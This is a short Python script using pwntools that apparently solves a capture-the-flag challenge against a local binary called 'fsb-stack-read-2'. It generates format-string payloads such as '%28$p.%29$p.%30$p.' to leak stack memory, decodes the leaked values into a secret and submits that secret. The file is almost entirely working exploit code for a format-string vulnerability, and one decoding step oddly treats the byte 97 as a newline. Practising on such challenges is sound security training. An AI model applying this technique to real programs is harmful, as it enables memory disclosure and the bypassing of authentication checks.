#!/usr/bin/env python3

from pwn import *

def generate(start: int, end: int, specifier: str = "p", seperator: str = "."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload

def fix(payload: bytes, seperator: str = "."):
	""" Unhex the payload and return as a string """
	rt = b""
	for i in payload.split(b'.')[:-1]: # the last one is empty
		i = i[2:] # removing the 0x
		if i[0] == 97: # remove the newline
			i = i[1:]
		rt += unhex(i)[::-1] # unhex and rev
	return rt
io = process("./fsb-stack-read-2")

# Generated Payload: %28$p.%29$p.%30$p.
payload = generate(28, 31)

io.sendline(payload)
io.recvuntil(b"Welcome ")
leak = io.recvline()[:-1]
print(f"Leaked: {leak}")
secret = fix(leak)
info(f"Got secret {secret}")
io.sendline(secret)
io.interactive()